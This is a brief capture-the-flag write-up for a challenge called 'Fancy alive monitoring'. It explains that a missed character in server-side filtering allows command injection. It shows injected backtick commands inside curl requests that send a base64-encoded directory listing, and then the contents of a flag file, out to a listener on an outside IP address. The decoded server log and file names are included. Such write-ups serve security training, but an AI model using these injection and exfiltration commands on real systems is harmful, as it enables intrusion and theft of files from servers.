# Fancy alive monitoring

I found that '$' is missed at server side filtering. So, we can inject our cmdline.

construct simple server using `python3 -m http.server`, and send injected request.

curl http://120.50.93.126/`ls|base64`

result is :

`18.224.157.204 - - [16/Oct/2018 01:17:47] "GET /aW5kZXgucGhwCmluZGV4LnR4dAp0aGUtc2VjcmV0LTE3NTUtZmxhZy50eHQKeGluZXRfc3RhcnR1 HTTP/1.1" 404 -`

```
index.php
index.txt
the-secret-1755-flag.txt
xinet_start
```

Then, send "curl http://120.50.93.126/`cat the-secret-1755-flag.txt|base64`"
